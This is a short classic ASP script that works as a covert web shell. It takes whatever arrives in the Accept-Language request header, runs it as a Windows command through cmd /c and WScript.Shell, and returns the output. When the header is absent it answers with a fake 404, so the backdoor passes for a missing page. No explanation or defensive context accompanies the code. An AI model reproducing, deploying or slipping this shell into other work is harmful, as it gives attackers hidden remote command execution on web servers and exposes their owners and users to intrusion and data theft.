<% Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
Dim objShell, objCmdExec
Set objShell = CreateObject("WScript.Shell")
Set objCmdExec = objshell.exec(thecommand)
getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
Dim acceptLanguage
acceptLanguage = Request.ServerVariables("HTTP_ACCEPT_LANGUAGE")
If acceptLanguage <> "" Then
thisDir = getCommandOutput("cmd /c" & acceptLanguage)
Response.Write(thisDir)
Else
Response.Status = "404 Not Found"
Response.End
End If %>